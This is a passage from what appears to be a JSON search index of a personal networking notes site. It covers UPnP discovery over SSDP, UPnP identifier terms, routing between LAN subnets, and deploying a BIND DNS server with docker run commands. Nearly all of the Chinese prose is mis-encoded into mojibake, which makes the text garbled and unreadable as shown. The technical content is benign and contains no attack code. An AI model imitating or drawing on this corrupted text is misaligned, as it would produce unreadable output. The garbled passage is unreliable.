UPnP åè®®çš„ä¸€å¤§ä¼˜ç‚¹ã€‚ UPnP UPnP é‡‡ç”¨æ ‡å‡†çš„ å¤šæ’­åœ°å€ 239.255.255.250, å®ç°åœ¨å±€åŸŸç½‘ä¸­è®¾å¤‡æœåŠ¡çš„è‡ªåŠ¨å‘ç° å¤§è‡´æµç¨‹å¦‚ä¸‹: è·¯ç”±å™¨/å½“å‰ç½‘ç»œ/å½“å‰è®¾å¤‡æ”¯æŒ UPnP å½“æœ‰æ–°çš„ UPnP è®¾å¤‡åŠ å…¥ç½‘ç»œæˆ–è€…å‘é€æœç´¢è¯·æ±‚,è¯¥è®¾å¤‡ä¼šå‘ 239.255.255.250:1900 å‘é€ç”Ÿå­˜é€šå‘Šæˆ–æœç´¢å“åº” (æ¥è¡¨ç¤ºè‡ªå·±æ˜¯ä¸€ä¸ª UPnP è®¾å¤‡) åŒæ—¶, UPnP æ§åˆ¶ç‚¹è®¾å¤‡ä¹Ÿä¼šä½¿ç”¨ UDP å‘é€æœç´¢è¯·æ±‚åˆ° 239.255.255.250:1900,å‘ç°ç½‘ç»œä¸­çš„ UPnP è®¾å¤‡ã€‚ ç®€å•æ¥è¯´: UPnP è®¾å¤‡ä½¿ç”¨ 239.255.255.250:1900 ä¸»åŠ¨å‘é€ç”Ÿå­˜é€šå‘Š,ä»¥å‘å¸ƒè‡ªå·±ã€‚ UPnP æ§åˆ¶ç‚¹ä½¿ç”¨ 239.255.255.250:1900 å‘é€æœç´¢è¯·æ±‚,ä»¥å‘ç° UPnP è®¾å¤‡ã€‚ UPnP è®¾å¤‡æ”¶åˆ°æœç´¢è¯·æ±‚å,ä¼šå“åº”åˆ°è¯·æ±‚æ¥æº(æ§åˆ¶ç‚¹),å‘å…¶å‘é€è®¾å¤‡æè¿°ç­‰ä¿¡æ¯ã€‚ ç„¶åæ§åˆ¶ç‚¹å’Œè®¾å¤‡ä¹‹é—´å¯ä»¥å»ºç«‹ç›´æ¥çš„ TCP è¿æ¥,ç”¨äºè®¾å¤‡æ§åˆ¶ã€äº‹ä»¶é€šçŸ¥ç­‰ã€‚ æ³¨è§£ UPnP è®¾å¤‡: æ¯ä¸ª UPnP è®¾å¤‡ éƒ½å¯è§†ä½œä¸€ä¸ªå•ç‹¬çš„æœåŠ¡ç«¯, æä¾›æœåŠ¡; éœ€è¦éµå¾ª UPnP è®¾å¤‡æ¶æ„,æä¾›è®¾å¤‡æè¿°ã€æœåŠ¡æè¿°ç­‰, å¦‚åª’ä½“æœåŠ¡å™¨ã€è·¯ç”±å™¨ç­‰ã€‚ UPnP æ§åˆ¶ç‚¹: å¯è§†ä½œ UPnP å®¢æˆ·ç«¯, è®¿é—®å’Œæ§åˆ¶æœåŠ¡; éœ€è¦éµå¾ª UPnP æ§åˆ¶ç‚¹æ¶æ„,çŸ¥é“å¦‚ä½•å‘ç°è®¾å¤‡ã€æŸ¥è¯¢æœåŠ¡å¹¶æ§åˆ¶, å¦‚ Windows Media Playerã€‚ è¿™å°±æ˜¯ UPnP ä¸­ä½¿ç”¨ UDP å¤šæ’­åœ¨å±€åŸŸç½‘ä¸­å®ç°è®¾å¤‡å‘ç°çš„åŸºæœ¬è¿‡ç¨‹ã€‚ æ¯ä¸ª UPnP è®¾å¤‡å’Œæ§åˆ¶ç‚¹éƒ½éœ€è¦æ”¯æŒè¿™ä¸ªæ ‡å‡†çš„å¤šæ’­åœ°å€å’Œç«¯å£(éƒ½éœ€è¦ç»‘å®šåˆ°æ ‡å‡†çš„å¤šæ’­åœ°å€ 239.255.255.250 å’Œç«¯å£ 1900 ä¸Š,), æ‰èƒ½å®ç°äº’ç›¸å‘ç°å’Œäº¤äº’ã€‚ é€šè¿‡è¿™ç§åŸºäº UDP å¤šæ’­çš„æ–¹å¼,UPnP è®¾å¤‡å’Œæ§åˆ¶ç‚¹ä¸éœ€è¦äº‹å…ˆçŸ¥é“å½¼æ­¤çš„ IP åœ°å€,å°±å¯ä»¥å®ç°è‡ªåŠ¨å‘ç°ä¸ä½¿ç”¨,è¿™ä¹Ÿæ˜¯ UPnP åè®®çš„ä¸€å¤§ä¼˜ç‚¹ã€‚ UPnP çš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬: è®¾å¤‡å‘ç°:UPnP è®¾å¤‡å¯ä»¥åŠ¨æ€åŠ å…¥å’Œç¦»å¼€ç½‘ç»œ,å¹¶é€šè¿‡ UPnP å‘ç°åè®®è¢«è‡ªåŠ¨æ£€æµ‹ã€‚ è®¾å¤‡æ§åˆ¶:UPnP è®¾å¤‡å¯ä»¥é€šè¿‡æ§åˆ¶åè®®è¿œç¨‹æ§åˆ¶å’ŒæŸ¥è¯¢ã€‚ äº‹ä»¶é€šçŸ¥:UPnP è®¾å¤‡å¯ä»¥å¼‚æ­¥é€šçŸ¥æ§åˆ¶ç‚¹æœ‰å…³è®¾å¤‡çŠ¶æ€çš„æ”¹å˜ã€‚ æœåŠ¡æè¿°:UPnP è®¾å¤‡åŒ…å« XML è®¾å¤‡å’ŒæœåŠ¡æè¿°,ç”¨äºå°†è®¾å¤‡åŠŸèƒ½åŠæ¥å£å…¬å¼€ç»™æ§åˆ¶ç‚¹ã€‚ åŸºæœ¬æ¶æ„:UPnP åè®®åŸºäºå¼€æ”¾äº’è”ç½‘åŸºç¡€è®¾æ–½å·¥ä½œç»„(Open InterConnect Consortium)åˆ¶å®šçš„æ¶æ„ã€‚ UPnP ä¸»è¦ç”±ä»¥ä¸‹å‡ ä¸ªåè®®ç»„æˆ: å‘ç°åè®®(SSDP):å¤„ç†æ–°è®¾å¤‡çš„åŠ å…¥å’Œç¦»å¼€ã€‚ è®¾å¤‡å’ŒæœåŠ¡æè¿°åè®®(XML):æè¿°è®¾å¤‡å’ŒæœåŠ¡çš„åŠŸèƒ½åŠæ¥å£ã€‚ æ§åˆ¶åè®®(SOAP):æä¾›è®¾å¤‡è¿œç¨‹æ§åˆ¶å’ŒæŸ¥è¯¢çš„æœºåˆ¶ã€‚ äº‹ä»¶é€šçŸ¥åè®®(GENA):æä¾›è®¾å¤‡ä¸»åŠ¨é€šçŸ¥æ§åˆ¶ç‚¹çŠ¶æ€å˜åŒ–çš„æœºåˆ¶ã€‚ UPnP å·²å¹¿æ³›åº”ç”¨äºå®¶åº­è‡ªåŠ¨åŒ–ã€äº’è”ç½‘æ¥å…¥æœåŠ¡ç­‰é¢†åŸŸã€‚ä¸»æµçš„ UPnP è®¾å¤‡å’Œæ§åˆ¶ç‚¹æœ‰ Windows ç³»åˆ—æ“ä½œç³»ç»Ÿã€å„ç§è·¯ç”±å™¨ã€åª’ä½“ä¸­å¿ƒç­‰ã€‚ è¯¦ç»†ç‚¹çš„å·¥ä½œæœºåˆ¶è¯´æ˜: UPnP çš„å·¥ä½œæœºåˆ¶ä¸»è¦åŒ…æ‹¬:åœ°å€åˆ†é…ã€å‘ç°ã€æè¿°ã€æ§åˆ¶å’Œäº‹ä»¶é€šçŸ¥äº”éƒ¨åˆ†ã€‚ åœ°å€åˆ†é…:UPnP è®¾å¤‡åŠ å…¥ç½‘ç»œå,é€šè¿‡è‡ªåŠ¨é…ç½®æˆ–åŠ¨æ€ä¸»æœºé…ç½®åè®®(DHCP)è·å¾—ä¸€ä¸ª IP åœ°å€ã€‚ å‘ç°:UPnP è®¾å¤‡é€šè¿‡ç®€å•æœåŠ¡å‘ç°åè®®(SSDP)å¹¿æ’­è‡ªå·±çš„å­˜åœ¨,å¹¶ä¾¦å¬å…¶ä»–è®¾å¤‡çš„å¹¿æ’­ã€‚å‘ç°è¿‡ç¨‹ä¸­äº¤æ¢è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€URL ç­‰ä¿¡æ¯ã€‚ æè¿°:æ¯ä¸ª UPnP è®¾å¤‡éƒ½æœ‰ä¸€ä¸ª XML è®¾å¤‡æè¿°æ–‡ä»¶å’Œä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æè¿°æ–‡ä»¶,æè¿°è®¾å¤‡å’ŒæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™äº›æè¿°æ–‡ä»¶æ ¹æ® UPnP è®¾å¤‡æ¶æ„åˆ¶å®šã€‚ æ§åˆ¶:UPnP ä½¿ç”¨ç®€å•å¯¹è±¡è®¿é—®åè®®(SOAP)å®ç°è®¾å¤‡çš„è¿œç¨‹æ§åˆ¶å’ŒæŸ¥è¯¢ã€‚ äº‹ä»¶é€šçŸ¥:UPnP ä½¿ç”¨é€šç”¨äº‹ä»¶é€šçŸ¥æ¶æ„(GENA)ä½¿è®¾å¤‡èƒ½ä¸»åŠ¨é€šçŸ¥æ§åˆ¶ç‚¹å…¶å†…éƒ¨çŠ¶æ€çš„å˜åŒ–ã€‚ UPnP å·²å¹¿æ³›åº”ç”¨äºå„ç§æ™ºèƒ½å®¶å±…å’Œäº’è”ç½‘æ¥å…¥è®¾å¤‡ã€‚ åœ¨ Windows ç³»ç»Ÿã€å„ç§è·¯ç”±å™¨ã€NAS å­˜å‚¨è®¾å¤‡ä¸­éƒ½é‡‡ç”¨äº† UPnP æŠ€æœ¯ã€‚ UPnP ç®€å•æ˜“ç”¨,è·¨å¹³å°å’Œäº’operability,å·²æˆä¸ºæ™ºèƒ½å®¶åº­ç½‘ç»œè”æ¥çš„é‡è¦åŸºçŸ³ã€‚ Windowså¼€å…³æµåª’ä½“æ”¯æŒ æš‚æ—¶åªä»‹ç»æœ€ç®€å•çš„ æ‰“å¼€: æ‰“å¼€Windows Media Player, ç‚¹å‡»æµåª’ä½“, æ ¹æ®æç¤ºæ‰“å¼€ å…³é—­: å»ç½‘ç»œå…±äº«ä¸­å¿ƒé‡åˆ¶å½“å‰ç½‘ç»œè®¾ç½®(æ²¡æœ‰ç›´æ¥å…³é—­çª—å£) å‚è€ƒ æºä»£ç åˆ†æåŠ DLNA å’Œ UPnP åè®®ç†è§£ UPnPåŸºæœ¬åŸç†ä»¥åŠåœ¨NATä¸­çš„åº”ç”¨ alljoynç‰©è”ç½‘ (è¿™ä¸ªæ²¡å•¥çœ‹çš„) UPnPåè®®ç¼–ç¨‹å®è·µ (è¿™ä¸ªç¼ºå°‘å›¾ç‰‡) æ›´æ–°ä¸€ä¸‹ ä¸Šé¢çš„æ–‡æ¡£å¿˜äº†æ˜¯å•¥äº†, é‡æœäº†ä¸€ä¸‹ https://www.cnblogs.com/lcw/p/3416730.html https://blog.csdn.net/maimang1001/article/details/122970389 è¿™ä¸ªæœ‰å›¾ç‰‡å±•ç¤º https://blog.csdn.net/weixin_41010318/article/details/78836718","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-related-by-yourself.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-related-by-yourself.html"},{"title":"upnpéƒ¨åˆ†å­—æ®µ/æœ¯è¯­ä»‹ç»","text":"UUID UUIDå«ä¹‰æ˜¯é€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼ˆUniversally Unique Identifierï¼‰ï¼Œ å…¶ç›®çš„æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ï¼Œå…¶æ ¼å¼ä¸ºxxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxxï¼ˆ8-4-4-16ï¼‰ï¼Œ åˆ†åˆ«è¡¨ç¤ºå½“å‰çš„æ—¥æœŸã€æ—¶é—´ã€å§‹ç»ˆåºåˆ—ã€å…¨å±€å”¯ä¸€çš„IEEEæœºå™¨æ ‡è¯†ï¼Œå¦‚æœæœ‰ç½‘å¡ï¼Œåˆ™ä»ç½‘ç»œçš„MACåœ°å€è·å–ï¼Œæ²¡æœ‰ç½‘å¡åˆ™ä»¥å…¶ä»–æ–¹å¼è·å¾—ã€‚ UDN å•ä¸€è®¾å¤‡åå­—ï¼ˆUnique Device Nameï¼‰ï¼ŒåŸºäºUUIDï¼Œè¡¨ç¤ºä¸€ä¸ªè®¾å¤‡ï¼Œåœ¨ä¸åŒçš„æ—¶é—´ï¼Œå¯¹äºåŒä¸€å°è®¾å¤‡æ­¤å€¼åº”è¯¥æ˜¯å”¯ä¸€çš„ã€‚ URI Webä¸Šå¯ç”¨çš„æ¯ç§èµ„æºï¼ŒåŒ…æ‹¬HTMLæ–‡æ¡£ã€å›¾åƒã€è§†é¢‘ç‰‡æ®µã€ç¨‹åºç­‰ï¼Œç”±ä¸€ä¸ªé€šç”¨èµ„æºæ ‡å¿—ç¬¦ï¼ˆUniversal Resource Identifierï¼Œç®€ç§°\"URI\"ï¼‰è¿›è¡Œå®šä½ã€‚URIä¸€èˆ¬æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼šè®¿é—®èµ„æºçš„å‘½åæœºåˆ¶ã€å­˜åœ¨èµ„æºçš„ä¸»æœºåã€èµ„æºè‡ªèº«çš„åç§°ï¼Œç”±è·¯å¾„è¡¨ç¤ºã€‚è€ƒè™‘ä¸‹é¢çš„URIï¼Œå®ƒè¡¨ç¤ºäº†å½“å‰çš„HTML 4.0è§„èŒƒï¼› http://www.webmonkey.com.cn/html/html40 /å®ƒè¡¨ç¤ºä¸€ä¸ªå¯é€šè¿‡HTTPåè®®è®¿é—®çš„èµ„æºï¼Œä½äºä¸»æœºwww.webmonkey.com.cnä¸Šï¼Œé€šè¿‡è·¯å¾„\"/html/html40\"è®¿é—® URL URLæ˜¯URIå‘½åæœºåˆ¶çš„ä¸€ä¸ªå­é›†ï¼ŒURLæ˜¯Uniform Resource Locationçš„ç¼©å†™ï¼Œè¯‘ä¸º\"ç»Ÿä¸€èµ„æºå®šä½ç¬¦\"ã€‚ å½¢è±¡ç‚¹è¯´ï¼ŒURLæ˜¯Internetä¸Šç”¨æ¥æè¿°ä¿¡æ¯èµ„æºçš„å­—ç¬¦ä¸²ï¼Œä¸»è¦ç”¨åœ¨å„ç§WWWå®¢æˆ·ç¨‹åºå’ŒæœåŠ¡å™¨ç¨‹åºä¸Šï¼Œ é‡‡ç”¨URLå¯ä»¥ç”¨ä¸€ç§ç»Ÿä¸€çš„æ ¼å¼æ¥æè¿°å„ç§ä¿¡æ¯èµ„æºï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€æœåŠ¡å™¨çš„åœ°å€å’Œç›®å½•ç­‰ã€‚ URN URNæ˜¯URLçš„ä¸€ç§æ›´æ–°å½¢å¼ï¼Œç»Ÿä¸€èµ„æºåç§°ï¼ˆUniform Resource Nameï¼‰ã€‚ å”¯ä¸€æ ‡è¯†ä¸€ä¸ªå®ä½“çš„æ ‡è¯†ç¬¦ï¼Œä½†æ˜¯ä¸èƒ½ç»™å‡ºå®ä½“çš„ä½ç½®ã€‚ URNå¯ä»¥æä¾›ä¸€ç§æœºåˆ¶ï¼Œç”¨äºæŸ¥æ‰¾å’Œæ£€ç´¢å®šä¹‰ç‰¹å®šå‘½åç©ºé—´çš„æ¶æ„æ–‡ä»¶ã€‚ å°½ç®¡æ™®é€šçš„URLå¯ä»¥æä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯URNæ›´å¼ºå¤§æ›´å®¹æ˜“ç®¡ç†ï¼Œå› ä¸ºå®ƒå¯ä»¥å¼•ç”¨å¤šä¸ªURLã€‚","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-UPNP-part-of-the-field-term-introduction.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-UPNP-part-of-the-field-term-introduction.html"},{"title":"UPnP","text":"upnpéƒ¨åˆ†å­—æ®µæœ¯è¯­ä»‹ç» è®¾å¤‡Â·æœåŠ¡ç±»å‹ è¯¦ç»†ä»‹ç» è‡ªå·±å®ç°DLNAç›¸å…³ è‡ªå·±å®ç°DLNAåª’ä½“æœåŠ¡å™¨","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-index.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-index.html"},{"title":"å±€åŸŸç½‘å†…è·¨ç½‘æ®µè®¿é—®","text":"æ–¹æ³•ä¸€:è·¯ç”±å™¨é…ç½®è·¯ç”± å¦‚æœéœ€è¦å…è®¸å¤šä¸ªç½‘æ®µäº’ç›¸è®¿é—®ï¼Œæ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è®¾ç½®è·¯ç”±å™¨ï¼š ç™»å½•è·¯ç”±å™¨ç®¡ç†æ§åˆ¶å° æ‰“å¼€æ‚¨çš„æµè§ˆå™¨ï¼Œè¾“å…¥é»˜è®¤ç½‘å…³çš„ IP åœ°å€ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œè·¯ç”±å™¨çš„é»˜è®¤åœ°å€ä¸º 192.168.1.1 æˆ– 192.168.0.1ã€‚ è¾“å…¥ç®¡ç†å‘˜ç”¨æˆ·åå’Œå¯†ç ä»¥ç™»å½•åˆ°è·¯ç”±å™¨ç®¡ç†ç•Œé¢ã€‚ åˆ›å»ºé™æ€è·¯ç”± åœ¨è·¯ç”±å™¨ç®¡ç†æ§åˆ¶å°ä¸­ï¼Œæ‰¾åˆ°\"è·¯ç”±è®¾ç½®\"æˆ–\"ç½‘ç»œè®¾ç½®\"ç­‰é€‰é¡¹ï¼Œå¹¶å•å‡»å®ƒã€‚ ç„¶åï¼Œå•å‡»\"æ·»åŠ è·¯ç”±\"æˆ–\"åˆ›å»ºè·¯ç”±è§„åˆ™\"ç­‰æŒ‰é’®ã€‚ åœ¨è·¯ç”±è®¾ç½®é¡µé¢ä¸­ï¼Œæ‚¨éœ€è¦åˆ›å»ºä¸€æ¡é™æ€è·¯ç”±æ¥å…è®¸ä¸åŒå­ç½‘ä¹‹é—´çš„é€šä¿¡ã€‚ å…·ä½“æ“ä½œå–å†³äºæ‚¨ä½¿ç”¨çš„è·¯ç”±å™¨å‹å·å’Œè½¯ä»¶ç‰ˆæœ¬ï¼Œä½†é€šå¸¸å¯å‚è€ƒä»¥ä¸‹é…ç½®: ç›®æ ‡ç½‘ç»œï¼šç›®æ ‡å­ç½‘åœ°å€ å­ç½‘æ©ç ï¼šç›®æ ‡å­ç½‘æ©ç  ä¸‹ä¸€è·³åœ°å€ï¼šè¿æ¥åˆ°ç›®æ ‡å­ç½‘çš„è®¾å¤‡ IP åœ°å€ æ¥å£ï¼šLANæˆ–WAN å°†\"ä¸‹ä¸€è·³åœ°å€\"æ›¿æ¢ä¸ºè¿æ¥åˆ°ç›®æ ‡å­ç½‘çš„è®¾å¤‡çš„ IP åœ°å€ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨è¦è¿æ¥åˆ° 192.168.2.0 å­ç½‘ï¼Œè¯¥å­ç½‘çš„ç½‘å…³ IP åœ°å€ä¸º 192.168.1.2ï¼Œåˆ™åº”å°†ä¸‹ä¸€è·³åœ°å€è®¾ç½®ä¸º 192.168.1.2ã€‚ æœ€åï¼Œå•å‡»\"ä¿å­˜\"æˆ–\"åº”ç”¨\"æŒ‰é’®ã€‚ é…ç½®é˜²ç«å¢™ å¦‚æœæ‚¨çš„è·¯ç”±å™¨ä¸Šå¯ç”¨äº†é˜²ç«å¢™ï¼Œåˆ™éœ€è¦é…ç½®é˜²ç«å¢™ä»¥å…è®¸æ‰€æœ‰å­ç½‘ä¹‹é—´çš„é€šä¿¡ã€‚ åœ¨è·¯ç”±å™¨ç®¡ç†æ§åˆ¶å°ä¸­ï¼Œæ‰¾åˆ°\"é˜²ç«å¢™è®¾ç½®\"æˆ–\"å®‰å…¨è®¾ç½®\"ç­‰é€‰é¡¹ï¼Œå¹¶å•å‡»å®ƒã€‚ ç„¶åï¼Œæ‰¾åˆ°\"è®¿é—®æ§åˆ¶åˆ—è¡¨\"ã€\"ç«¯å£è½¬å‘\"æˆ–\"è™šæ‹ŸæœåŠ¡å™¨\"ç­‰é€‰é¡¹ï¼Œå¹¶å•å‡»\"æ·»åŠ è§„åˆ™\"æˆ–\"æ–°å»º\"ç­‰æŒ‰é’®ã€‚ å…·ä½“æ“ä½œå–å†³äºæ‚¨ä½¿ç”¨çš„è·¯ç”±å™¨å‹å·å’Œè½¯ä»¶ç‰ˆæœ¬ï¼Œä½†é€šå¸¸å¯å‚è€ƒä»¥ä¸‹é…ç½®: åè®®ï¼šå…¨éƒ¨æˆ–TCP/UDP æ¥æºIPï¼šæºå­ç½‘åœ°å€ ç›®æ ‡IPï¼šç›®æ ‡å­ç½‘åœ°å€ ç›®æ ‡ç«¯å£ï¼šå…¨éƒ¨æˆ–æŒ‡å®šç«¯å£ åŠ¨ä½œï¼šå…è®¸ è¯·å°†\"æºIP\"æ›¿æ¢ä¸ºæºå­ç½‘çš„ IP åœ°å€èŒƒå›´ï¼Œ\"ç›®æ ‡IP\"æ›¿æ¢ä¸ºç›®æ ‡å­ç½‘çš„ IP åœ°å€èŒƒå›´ã€‚æœ€åï¼Œå•å‡»\"ä¿å­˜\"æˆ–\"åº”ç”¨\"æŒ‰é’®ã€‚ é—®é¢˜ å¯èƒ½ä¼šé™ä½ç½‘ç»œå®‰å…¨æ€§ å¦‚æœéœ€è¦å…è®¸å¾ˆå¤šå­ç½‘ä¹‹é—´çš„äº’ç›¸è®¿é—®ï¼Œæ‰‹åŠ¨é…ç½®é™æ€è·¯ç”±å’Œé˜²ç«å¢™è§„åˆ™å¯èƒ½ä¼šéå¸¸éº»çƒ¦ã€‚ä¸ºäº†ç®€åŒ–è¿™ä¸ªè¿‡ç¨‹ï¼Œæ‚¨å¯ä»¥è€ƒè™‘ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š ä½¿ç”¨åŠ¨æ€è·¯ç”±åè®® åŠ¨æ€è·¯ç”±åè®®å¯ä»¥è‡ªåŠ¨å­¦ä¹ å’Œæ›´æ–°è·¯ç”±è¡¨ï¼Œä»è€Œä¼˜åŒ–ç½‘ç»œé€šä¿¡ã€‚ ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨OSPFï¼ˆå¼€æ”¾å¼æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼‰æˆ–BGPï¼ˆè¾¹ç•Œç½‘å…³åè®®ï¼‰ç­‰è·¯ç”±åè®®æ¥ç®¡ç†å¤šä¸ªå­ç½‘ä¹‹é—´çš„é€šä¿¡ã€‚ é€šè¿‡åŠ¨æ€è·¯ç”±åè®®ï¼Œè·¯ç”±å™¨å¯ä»¥è‡ªåŠ¨å‘ç°æ–°çš„ç½‘ç»œå’Œè·¯ç”±ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®æ¯ä¸ªå­ç½‘çš„è·¯ç”±ã€‚ ä½¿ç”¨SDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰ SDNå°†ç½‘ç»œæ§åˆ¶åˆ†ç¦»å‡ºæ¥ï¼Œä½¿ä¸šåŠ¡èƒ½å¤Ÿä»¥é›†ä¸­çš„æ–¹å¼ç®¡ç†ç½‘ç»œã€‚ å®ƒæä¾›äº†ä¸“é—¨çš„æ§åˆ¶å™¨æ¥ç®¡ç†è·¯ç”±å’Œç­–ç•¥ï¼Œå¹¶å…è®¸ç®¡ç†å‘˜éšæ—¶æ›´æ”¹ç½‘ç»œé…ç½®ã€‚ é€šè¿‡SDNï¼Œæ‚¨å¯ä»¥è½»æ¾åœ°æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹è·¯ç”±å’Œé˜²ç«å¢™è§„åˆ™ï¼ŒåŒæ—¶ä¼˜åŒ–ç½‘ç»œæ€§èƒ½å’Œå¯é æ€§ã€‚ æ–¹æ³•äºŒ:VPN","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-Visit-of-cross--net-section-of-the-local-area-network.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Visit-of-cross--net-section-of-the-local-area-network.html"},{"title":"dockerä½¿ç”¨ubuntu/bindéƒ¨ç½²dnsæœåŠ¡","text":"ä½¿ç”¨çš„é•œåƒ: ubuntu/bind9 åˆ›å»ºå®¹å™¨: mkdir -p dns_config docker run -d --name bind9-dns-server -e TZ=UTC -p 30053:53 -v dns_config:/data ubuntu/bind9:9.18-22.04_beta åé¢æ–¹å¼åŸºæœ¬ä¸ : ubuntué…ç½®dns ä¸€è‡´ å…¶ä»– å…·æœ‰ç®¡ç†é¢æ¿çš„docker-bind: ä½¿ç”¨Dockeræ­å»ºè‡ªå·±çš„DNSæœåŠ¡å™¨","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-Docker-uses-Bind-to-deploy-the-DNS-service.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-Docker-uses-Bind-to-deploy-the-DNS-service.html"},{"title":"dockerä½¿ç”¨bindéƒ¨ç½²dnsæœåŠ¡-ç®¡ç†é¢æ¿","text":"ä½¿ç”¨çš„é•œåƒ: sameersbn/bind ä½¿ç”¨bindé•œåƒåˆ›å»º: # åˆ›å»ºä¸€ä¸ªæŒä¹…åŒ–å­˜æ”¾æ–‡ä»¶çš„ç›®å½• mkdir -p sameersbn/bind # ä½¿ç”¨å®¹å™¨åˆ›å»ºåº”ç”¨ # --restart=always docker run --name bind -d \\ --publish 53:53/tcp --publish 53:53/udp --publish 10000:10000/tcp \\ --volume /Users/yanque/project/docker/sameersbn/bind:/data \\ sameersbn/bind:9.16.1-20200524 è‹¥éœ€è¦å¤–ç½‘è®¿é—®, æ³¨æ„å¼€æ”¾53çš„tcpä¸udpç«¯å£ åœ¨æœ¬æœºæµè§ˆå™¨æ‰“å¼€: https://localhost:10000 , é»˜è®¤è´¦æˆ·å¯†ç root/passwordç™»å½•, ç„¶åæ›´æ”¹è¯­è¨€ä¸ºä¸­æ–‡. æ›´æ–°è¯­è¨€ä¸ºä¸­æ–‡ åˆ›å»ºæ–°çš„ä¸»åŒºåŸŸ å¡«å†™åŸŸå, é‚®ç®±, ç„¶åç‚¹å‡»æ–°å»º é€‰æ‹©åœ°å€, ç„¶åå¡«å†™å‰ç¼€åç§°ä¸ip (æœ¬æœºip) æ›´æ–°æœ¬æœºdns (æœ¬æœºip) æŠ€å·§ å¦‚æœæ˜¯åœ¨æœ¬æœºä½¿ç”¨, å¯ä»¥ç›´æ¥å†™ 127.0.0.1 è®¿é—®å…¬ç½‘: # vim sameersbn/bind/bind/etc/resolv.conf nameserver 114.114.114.114 nameserver 8.8.8.8 # vim sameersbn/bind/bind/etc/named.conf.options # æ·»åŠ ä¸€è¡Œï¼Œå†…å®¹å¦‚ä¸‹ï¼š allow-query { any; }; é‡å¯ä¸€ä¸‹æœåŠ¡ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¿™æ ·æ‰èƒ½ä½¿ç”¨é…ç½®ç”Ÿæ•ˆ: docker restart bind æµ‹è¯•, è®¿é—® è‡ªå·±è®¾ç½®çš„åœ°å€ http://doc.yanquer.com : è®¿é—® å…¶ä»– å…·æœ‰ç®¡ç†é¢æ¿çš„docker-bind: ä½¿ç”¨Dockeræ­å»ºè‡ªå·±çš„DNSæœåŠ¡å™¨","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-docker-bind-deploy-DNS-management-panel.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-docker-bind-deploy-DNS-management-panel.html"},{"title":"è‡ªå»ºå±€åŸŸç½‘dnsæœåŠ¡å™¨","text":"å®Œå…¨é™å®šåŸŸå(FQDN) = ä¸»æœºå + åŸŸå. ä¾‹: www.baidu.com = www(ä¸»æœº) + baidu.com(åŸŸå) æœ¬æœºè§£æå¯»æ‰¾é¡ºåº: æœ¬æœºhostæ–‡ä»¶ -> dnsæœåŠ¡å™¨ DNSè§£ææ–¹å¼: æ­£å‘è§£æ FQDN -> IP åå‘è§£æ IP -> FQDN ç¯å¢ƒæ­å»º å‡†å¤‡ä¸€ä¸ªä¸»æœºæœåŠ¡å™¨, è®¾ç½®é™æ€ip, æ³¨æ„ä¿è¯ä½¿ç”¨çš„æœºå™¨ä¸æ­¤æœºå™¨åœ¨åŒä¸€ä¸ªç½‘æ®µ æ‰“å¼€windowsåŠŸèƒ½ç®¡ç†, å®‰è£… DNSæœåŠ¡å™¨ æ‰“å¼€: æœåŠ¡å™¨ç®¡ç† -ã€‰å·¥å…· -> DNSæœåŠ¡å™¨ ubuntué…ç½®dnsæœåŠ¡å™¨ /docs/æ‚ä¹±æ— ç« /è®¡ç®—æœºç½‘ç»œ/config_dns/ubuntué…ç½®dns å…¶ä»–éƒ¨ç½²æ–¹å¼ Dockeréƒ¨ç½²bind: /docs/æ‚ä¹±æ— ç« /è®¡ç®—æœºç½‘ç»œ/config_dns/dockerä½¿ç”¨bindéƒ¨ç½²dnsæœåŠ¡ Linuxä½¿ç”¨bind: /docs/æ‚ä¹±æ— ç« /è®¡ç®—æœºç½‘ç»œ/config_dns/ubuntué…ç½®dns (debianä¹Ÿå¯) ç»¼åˆ docker-bindéƒ¨ç½²dns-ç®¡ç†é¢æ¿ dockerä½¿ç”¨bindéƒ¨ç½²dnsæœåŠ¡ 